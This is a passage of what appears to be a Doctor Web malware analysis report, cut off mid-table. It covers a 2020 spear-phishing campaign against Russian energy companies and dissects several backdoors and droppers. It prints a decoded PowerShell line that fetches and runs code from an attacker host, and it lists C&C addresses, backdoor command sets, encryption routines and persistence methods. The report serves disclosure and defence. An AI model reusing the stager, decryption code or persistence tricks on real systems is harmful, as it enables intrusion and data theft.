Indicators of Compromise 23\n\n\n-----\n\n### The scouting\n\n\nAt the end of April 2020, Doctor Web virus analysts detected a spear phishing campaign where\nemployees of Russian fuel and energy companies were receiving emails with bogus attachments.\nThese emails contained .docx files that were distributed under the guise of an updated\ntelephone book and downloaded two images from remote resources.\n\nOne of the images was uploaded to a user’s PC from news[.]zannews[.]com. It is noteworthy that\nthis domain name is similar to the domain of the anti-corruption media center of Kazakhstan—\nzannews[.]kz. On the other hand, this domain instantly recalled another well-known campaign\nfrom 2015, known as TOPNEWS, where the ICEFOG backdoor was used, and trojan C&C\ndomains had the “news” substring in their names. Another interesting feature was the use of\ndifferent request parameters or unique image names in download requests in those cases when\nemails were sent to different recipients. We believe this was done to collect information and\nidentify a \"reliable\" recipient who is guaranteed to open an email in subsequent attacks. The SMB\nprotocol was used to download the image from the second server, which could be done to\ncollect NetNTLM hashes from the employees’ computers who opened the received document.\n\nIn June 2020, the attackers started to use a new domain name—sports[.]manhajnews[.]com. Our\nanalysis revealed that manhajnews[.]com subdomains have been used in spear phishing\ncampaigns since at least September 2019. Thus, one of the targets of this campaign was a large\nRussian university.\n\nIn addition, another campaign was launched in June. This time, the attached document contained\ninformation about industry development. The text in the email clearly indicated the author was\nnot a native Russian speaker. With that, the remote server was changed to download[.]\ninklingpaper[.]com\n\n\n-----\n\nAs an attempt to avoid the anti-virus detection of malicious documents, in July, hackers began\nusing Microsoft Word documents encrypted with a password. At the same time, they have\nslightly modified the content of the email.\n\nThe text was again written in the same style, which caused additional suspicion in the recipient.\nThe remote server for image downloading did not change either.\n\nIt is worth noting that in all cases mentioned above, the attackers used mailboxes registered on\nthe mail[.]ru and yandex[.]ru domains.\n\n\n-----\n\n### The attack\n\nIn early September 2020, our virus analysts detected a new spear phishing campaign, where\nattackers again sent emails disguised as the updated telephone book. However, this time the\nemail attachment contained a malicious macro.\n\nUpon opening the document, this macro created two files: The first one was VBS script %\n```\nAPPDATA%\\\\microsoft\\\\windows\\\\start menu\\\\programs\\\\startup\\\n\\adoba.vbs, designed to launch the batch file. The second file was the batch file itself.\n\n```\nIts main task is to launch Powershell with certain parameters. Parameters transmitted to the shell\nare decoded into the following commands:\n```\n $o = [activator]::CreateInstance([type]::GetTypeFromCLSID(\"F5078F35-C551 11D3-89B9-0000F81FE221\"));$o.Open(\"GET\",\n \"http://newsinfo.newss.nl/nissenlist/johnlists.html\", $False);$o.Send();\n IEX $o.responseText;\n\n```\nAs follows from the commands above, the domain used for uploading the payload is again\ndisguised as a news website. A simple trojan downloader is delivered on the compromised\ncomputer, whose sole purpose is to download shellcode from the C&C server and then execute\nit. Doctor Web specialists managed to uncover two types of backdoors that can be installed on\nthe compromised computers.\n\nThe first of them—BackDoor.Siggen2.3238—has not been previously encountered by our team.\nAny mention of this malware by other anti-virus vendors has also not been found. The second\nbackdoor is a modification of BackDoor.Whitebird, which is already known to us from the\n[incident with the state institution in Kazakhstan. Additionally, during our research we located](https://news.drweb.com/show/?i=13907&lng=en)\nanother domain name that was used during this spear phishing campaign—news[.]microotf[.]\ncom. However, we have not found any trojans using this domain as a C&C server.\n\n\n-----\n\n### Conclusion\n\nAnalysis of documents, malware, and the infrastructure used allows us to say the attack was\nconducted by one of the Chinese APT groups. Given the functionality of backdoors installed on\nvictims' computers in the event of a successful attack, the infection would allow hackers to at\nleast steal confidential information from compromised computers of the attacked organizations.\nIn addition, a very likely scenario of a further attack is the installation of specialized trojans on\nlocal servers of high importance, such as domain controllers, mail servers, Internet gateways, etc.\n[As we saw in the example of the incident in Kazakhstan, these servers are of particular interest to](https://news.drweb.com/show/?i=13907&lng=en)\nattackers for various reasons.\n\nDoctor Web malware analysts recommend users pay extra attention to all incoming\ncorrespondence, including emails received from allegedly known addressees.\n\n[A harmful attachment containing a malicious macro was successfully detected by the Dr.Web](https://drweb.com/vxcube)\n[vxCube cloud-based analyser.](https://drweb.com/vxcube)\n\n\n-----\n\n### Operating Routine of Discovered Malware Samples\n\n\n#### BackDoor.Whitebird.23\n\nA backdoor written in C++ and designed to operate in both 32-bit and 64-bit Microsoft\nWindows operating systems. BackDoor.Whitebird.23 is designed to establish an encrypted\nconnection with the C&C server and for unauthorized control over an infected computer.\n\n##### Operating routine\n\n**Start of operation**\n\nThe malicious library has two export functions:\n```\n GooglePlay\n Test\n\n```\nAt the beginning of its operation, the backdoor decrypts the hardcoded configuration using an\nalgorithm based on the XOR operation with byte 0x99. The configuration:\n\n\n-----\n\nTo ensure the backdoor is always running, it changes the value specified in the working_hours\nfield of the configuration. The field contains 1440 bytes, which take the values 0 or 1 and\nrepresent every minute of every hour in a day.\n\nThe program creates a separate thread for each network interface that listens to that interface\nand searches for authorization packets on the proxy server from the infected computer. When\nsuch a packet is detected, the backdoor adds information about the proxy server to its own list.\nIt also checks for proxy via the InternetQueryOptionW WinAPI. The list with proxy\ninformation has the following structure:\n```\n struct st_proxy\n {\n  st_proxy *next;\n  st_proxy *prev;\n  _DWORD proxy_type;\n  _DWORD proxy_addr;\n  unsigned __int16 proxy_port;\n  _DWORD got_proxy;\n  const char login[255];\n  const char password[255];\n  const char char216[255];\n };\n\n```\nProxy server configurations are additionally saved in the %TEMP file%\\\n```\n\\<computer_name>_r.xra file.\n\n```\nThe program then checks the current minute and hour and compares them with the data in the\n```\nworking_hours field of the configuration. If the value for the corresponding minute of the day\n\n```\nis not zero, it establishes a connection to the C&C server.\n\n\n-----\n\nIf the connection to the server is successful, the backdoor collects information about the infected\ncomputer and forms the following structure:\n```\n #pragma pack(push, 1)\n struct st_info\n {\n  wchar_t campaign[64];\n  _DWORD dword80;\n  WCHAR username[64];\n  wchar_t macs[20];\n  RTL_OSVERSIONINFOW osversion;\n  _BYTE gap130[8];\n  WCHAR computer_name[16];\n  _BYTE gap24A[96];\n  st_drive_info drives[26];\n  _BYTE gap2D0[312];\n  _DWORD mem_total_phys;\n  _DWORD mem_available_phys;\n  DWORD cpu_nop;\n  DWORD cpu_freq;\n  _BYTE cpu_info[128];\n  _DWORD x64;\n  WCHAR locale[6];\n };\n #pragma pack(pop)\n\n```\nThe program sends the collected information to the C&C server and waits for 2 bytes in\nresponse. The first of these two bytes the backdoor will send after processing the server\ncommand.\n\nThen it sends the byte 0x10, which is a command request from the C&C server. In response, the\nserver must send 16 bytes, where the first DWORD serves as the command ID.\n\n\n-----\n\nThe list of commands is shown in the following table:\n\n|Command id|Action|\n|---|---|\n|0x01|To send a list of files in the folder|\n|0x15|To delete a file|\n|0x16|To delete a directory|\n|0x17|To move a file|\n|0x18|To open a file|\n|0x19|To write a file|\n|0x1b|To read a file|\n|0x32|To send a list of processes|\n|0x33|To terminate a specified process|\n|0x50|To send a list of services|\n|0x51|To send a configuration of the specified service|\n|0x52|To run a service|\n|0x53|To stop a service|\n|0x54|To delete a service|\n|0x64|To run the command shell with I/O redirecting to pipes or run the command in the command shell|\n|0x65|To establish an additional connection with the C&C server and run the command shell with I/O redirecting to socket|\n|0x3e7|To remove itself from the system|\n\n\n-----\n\n**Protocol for communicating with the C&C server**\n\nEstablishing a connection to the server simulates creating a connection over TLS 1.0 protocol\nbetween the client and the server. The backdoor contains two buffers in its body:\n\nThe first buffer contains the TLS 1.0 Client Hello packet.\n\nThe second buffer contains TLS 1.0 Client Key Exchange with a key length of 0x100 bytes,\nthe Change Cipher Spec and Encrypted Handshake Message packets.\n\nWhen sending a Client Hello packet, the backdoor writes to the Client Random field 4\nbytes of the current time and 28 bytes of pseudo-random data, which are calculated as follows:\n\n\n-----\n\nThe resulting packet is sent to the C&C server. The response (Server Hello packet) is checked\nfor compliance with the following parameters:\n\n- If the TLS Protocol version corresponds to version 1.0;\n\n- The match between the timestamp (the first 4 bytes of the Random Data field) specified by\nthe client and the timestamp specified by the server;\n\n- The match between the first 4 bytes after the timestamp in the Random Data field specified\nby the client and these 4 bytes specified by the server.\n\nIn the case of these matches, the backdoor prepares the Client Key Exchange packet. To\ndo this, it modifies Public Key in the Client Key Exchange packet, as well as the\n```\nEncryption IV and Encryption Data in the Encrypted Handshake Message packet.\n\n```\n\n-----\n\nThe backdoor then receives the packet from the C&C server, checks that the TLS Protocol version\ncorresponds to version 1.0, and then receives another 54 bytes (the packet body). This\ncompletes the connection establishment.\n\nAll received and sent packets are transmitted over the TLS 1.0 protocol, and the encryption of\nthese packets is determined by the following algorithm:\n```\n for ( i = 0; i < size; ++i )\n  buffer[i] ^= 7 * (_BYTE)i;\n\n```\nIf the client or server failed to accept a packet in one attempt, it sends back a packet, which is\nformed as follows:\n```\n t = time(0);\n ...\n for ( j = 0; j < 10; ++j )\n  Src[j] = (unsigned __int16)(0x71 * (t + 35)) >> 8;\n tls_send_packet(socket, Src, 0xAu);\n\n#### Trojan.DownLoader34.31724\n\n```\n**Trojan.DownLoader34.31724 is a shellcode loader written in C++. It works both in 32-bit and**\n64-bit Microsoft Windows operating systems.\n\n##### Operating routine\n\nThe C&C server address is hardcoded in trojan’s body and is plain text: https://newsfor[.]\n```\nnewss[.]nl.\n\n```\nUsing the CoCreateGuid function, the program generates a GUID (Globally Unique Identifier),\nwhich is then used as the identifier of the infected device.\n\n\n-----\n\nIt then sends a GET request to the C&C server with the User-Agent: \"WinHTTP\n```\nExample/1.0\" HTTP header to https://newsfor[.]newss[.]nl/<uuid>&0&4, where:\n\n```\n - <uuid>—previously created uuid,\n\n - 0—the sequence number of the request,\n\n - 4—a number, hardcoded in the trojan’s body.\n\nIn response to this GET request, the trojan waits for the shellcode delivery, and then sends\nanother GET request. If the first DWORD in the response is equal to 1, it then executes the\npreviously received shellcode.\n\nThe result of the shellcode execution is sent by a POST request to the same URL that is used for\nGET requests.\n\n#### BackDoor.Siggen2.3244\n\nA trojan dropper designed to spread and install other malicious applications onto the targeted\ncomputers. The malware is written in C and supports 32-bit and 64-bit Microsoft Windows\noperating systems. The analyzed sample was used to spread the BackDoor.Whitebird.23 trojan.\n\n##### Operating routine\n\nThe sample in question was distributed inside the SFX RAR archive containing the following files:\n\n - migwiz.exe—the main dropper\n\n - migwiz3.DAT—an encrypted shellcode with the payload for 32-bit Microsoft Windows\noperating systems\n\n - migwiz6.DAT—an encrypted shellcode with the payload for 64-bit Microsoft Windows\noperating systems\n\n**Main dropper migwiz.exe**\n\nUpon launching, it enables the following system privileges for its own process:\n\n - SeDebugPrivilege\n\n - SeAssignPrimaryTokenPrivilege\n\n - SeBackupPrivilege\n\n - SeRestorePrivilege\n\nNext, depending on the bitness of the operating system, it reads the migwiz3.DAT or\n```\nmigwiz6.DAT file located in the same directory from where the trojan was launched. If it has\n\n```\nadministrator rights, it saves the contents of the corresponding file into the [HKLM\\\n```\n\\Software\\\\Microsoft\\\\MigWlz\\\\Options] registry key with the Setup value. If it\n\n```\n\n-----\n\ndoesn’t have appropriate rights, it saves the file contents into the [HKCU\\\\Software\\\n```\n\\Microsoft\\\\MigWlz\\\\Options] registry key with the Setup value.\n\n```\nThese keys store the payload that the trojan will extract and launch later (see the “The payload”\nsection below).\n\nIf the dropper was launched with administrator rights, it sets an autorun option for the IKEEXT\nservice. It then checks if the %WINDIR%\\\\System32\\\\wlbsctrl.dll file exists. If the file\nexists, the trojan fills it with random data, deletes the file and replaces it with the new one, which\nis encrypted and packed through the RtlCompressBuffer and stored in its body. To decrypt\nthe file, it uses the following script:\n```\n def decrypt(data):\n   a = b = c = d = struct.unpack('<I', data[:4])[0]\n   s = bytearray()\n   for i in range(len(data)):\n     a = (a + (a >> 3) - 0x3C6312B6) & 0xffffffff\n     b = (b + (b >> 5) - 0x62B652F6) & 0xffffffff\n     c = (c + 0x6251F3E2 - (c << 9)) & 0xffffffff\n     d = (d + (0xCD56823E - (d << 7))) & 0xffffffff\n     s.append(data[i] ^ ((a + b + c + d) & 0xff))\n   return s\n\n```\nWith that, the trojan writes a large block of the random data into the end of the extracted file.\nThis block starts with the 0xcc90 signature and has the size of 0x8FF1B6 bytes for the 64-bit\nlibrary and the size of 0x8FF437 bytes for the 32-bit library.\n\nThe trojan sets the same date of creation, access and modification for the extracted library as the\n```\n%WINDIR%\\\\System32\\\\rundll32.exe system file has. After that, it launches the IKEEXT\n\n```\nservice, which loads the malicious library into the memory.\n\n\n-----\n\nIf the trojan was launched without administrator rights, it checks if the %ProgramData%\\\n```\n\\migwiz directory exists. If it exists, the trojan fills every file in it with the random data and\n\n```\ndeletes these files. Next, it deletes the directory itself.\n\nAfter that, the trojan recreates this directory and places the migwiz.exe and migwiz.dll\nfiles, which it extracts from its body, into this catalogue. Herewith, the library migwiz.dll\nrepresents the same library that is saved into the %WINDIR%\\\\System32\\\\wlbsctrl.dll\ndirectory if the trojan has the appropriate administrative rights.\n\nThe trojan then adds the migwiz.exe file to the autorun list, creating the [HKCU\\\\Software\\\n```\n\\Microsoft\\\\Windows\\\\CurrentVersion\\\\run] registry key with the migwiz\n\n```\nparameter.\n\nFor the migwiz.exe and migwiz.dll files, as well as for the directory where they are located,\nthe trojan sets the same date of creation, access and modification as the rundll32.exe\nsystem file has. It then launches the migwiz.exe file.\n\n**migwiz.exe loader**\n\nSearches for the dll libraries that are located in the same directory with it and loads them into the\nmemory.\n\n**migwiz.dll loader**\n\nUses the mutex to ensure only one copy of the trojan is running at the same time. If the trojan is\nlaunched as a service, the mutex has the Global/Configer name. In other cases, the mutex\nhas the LocalConfiger name.\n\nDepending on how the trojan is launched, the loader reads the payload from the [HKLM\\\n```\n\\Software\\\\Microsoft\\\\MigWlz\\\\Options] 'Setup' or [HKCU\\\\Software\\\n\\Microsoft\\\\MigWlz\\\\Options] 'Setup' registry keys. If the reading was successful, the\n\n```\npayload is decrypted with the XOR operation and the 0x90 byte.\n\nNext, if the trojan was launched as a service, it injects the payload into the running\n```\nexplorer.exe process. Otherwise, it injects the payload into its own process.\n\n```\n**The payload**\n\nThe payload is stored in the Windows registry, where it is placed at the initial stage of infection\nafter it was read from the migwiz3.DAT and migwiz6.DAT files. It contains the shellcode that\nobtains the addresses of the minimum number of functions required by the trojan and loads it\nfrom its own body as an MZPE file. This file represents a dll library detected by Dr.Web as\n**BackDoor.Whitebird.23.**\n\n\n-----\n\n#### BackDoor.Siggen2.3238\n\nA backdoor trojan for 32-bit Microsoft Windows operating systems. It is written in C++. Its main\nfunctionality is to obtain unauthorized access to infected computers and perform malicious\nactions on behalf of attackers.\n\n##### Operating routine\n\nUpon launching, BackDoor.Siggen2.3238 initiates a series of preliminary checkups. First, it\nreceives the addresses of the following exported functions:\n\n - CreateDirectoryExW\n\n - NtQueryDirectoryFile\n\n - NtDeleteFile\n\n - NtWriteFile\n\n - NtReadFile\n\n - NtCreateFile\n\n - NtSetInformationFile\n\n\n-----\n\nNext, it verifies the pointer to each function using the algorithm as follows:\n\nIf the data at the pointer matches the one to be checked, the trojan allocates a memory region in\nthe size of 1 byte, fills 10 bytes in this region with zeroes and tries to free it:\n\nThis operation is performed for each exported function. By doing so, the backdoor most likely\nchecks for the active hooks in the functions and attempts to terminate the active process.\n\n**BackDoor.Siggen2.3238 then checks if the false and true strings hardcoded in its code are**\nmatching. If they match, the trojan checks for the VMWare and VirtualBox components, namely\nVMWare Guest Additions, Virtual Machine Additions and Virtualbox Guest Additions, are present\nin the system. After this verification is complete, its results are reset, and the trojan enters an\nendless loop where it doesn’t perform any other action.\n\n\n-----\n\n##### The main functionality\n\n**BackDoor.Siggen2.3238 can connect to the C&C server using both HTTP and HTTPS protocols.**\nThe analyzed trojan sample uses the HTTPS protocol. When sending the requests to the server,\nthe following User-Agent is used:\n```\nMozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0; SE)\n\n```\nWith that, all the requests are sent with the set of the parameters as follows:\n```\n%s;type=%s;length=%s;realdata=%send\n\n```\nwhere each %s string is correspondingly replaced by the strings shown below:\n\n- the infected computer ID\n\n- the type of the request to be sent\n\n- the length of the data in the realdata field\n\n- the data\n\n\n-----\n\nAfter the initial verification is complete, BackDoor.Siggen2.3238 generates its own ID using the\nfollowing function:\n\nNext, it collects the information about the infected system and forms the string shown below:\n```\nlan=%s;cmpname=%s;username=%s;version=%s;\n\n```\nwhere lan is the IP address of the infected computer, cmpname is the name of the computer,\n```\nusername is the user name, and version is a 0.0.4.03 string.\n\n```\nThis information, paired with the sysinfo ID, is sent to the C&C server located at the\nhttps://31.214.157.14/log.txt. If BackDoor.Siggen2.3238 receives the HEART signal in response,\nthe connection is considered successful, and the trojan proceeds to the main cycle of\ncommunication with the server.\n\nTo receive new commands, the backdoor sends the packet with the HEART command ID with\nthe heart data. The server response that follows is parsed with the regular expression shown\nbelow:\n```\ntype=([^&]+);first=([^&]+);second=([^&]+);third=([^&]+);\n\n```\nThe type string in this response characterizes which command needs to be executed, while\nother strings contain the parameters for these commands.\n\n**BackDoor.Siggen2.3238 can receive the following commands:**\n\n|Command|Description|\n|---|---|\n|HEART|Heartbeat (a beacon signal that keeps the C&C server and the backdoor connected).|\n\n\n-----\n\n|OK|A server confirmation indicating the data sent by the trojan has been received successfully.|\n|---|---|\n|CMDINFO|To launch the cmd.exe with the input-output redirection into the pipes, through which the data is sent to the server and back.|\n|PROCESSINFO|To collect information about the running processes. The information about each process is represented as proName=%1%;PID=%2%;proPath=%3%;Tport=% 4%;Uport=%5%;descrip=%6%;.|\n|PROCESSTERMINATE|To kill the process with the specified PID.|\n|LISTDRIVE|To collect information about disks.
